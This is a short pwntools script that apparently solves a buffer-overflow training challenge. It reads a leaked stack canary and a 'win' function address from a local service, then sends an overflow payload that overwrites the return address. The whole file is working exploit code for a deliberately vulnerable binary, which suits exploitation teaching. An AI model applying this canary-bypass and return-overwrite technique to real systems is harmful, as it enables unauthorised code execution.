from pwn import *
#context.log_level = 'DEBUG'
p = remote('127.0.0.1',1337)
#p = process('./buffer_overflow_school-dist.o')
p.recvuntil("function at ")
win = int(p.recvuntil(" (win)", drop=True), 16)
print(hex(win))
p.sendline("A")
p.recvuntil("Stack Canary\t\t: ")
canary = int(p.recvuntil("\n"),16)
print(hex(canary))
p.sendlineafter("Retry? (Y/N)","Y")
buffer = b"A"*0x18
p.sendline(buffer + p64(canary) + p64(0x8) + p64(win))
p.sendlineafter("Retry? (Y/N)","N") 
p.interactive()
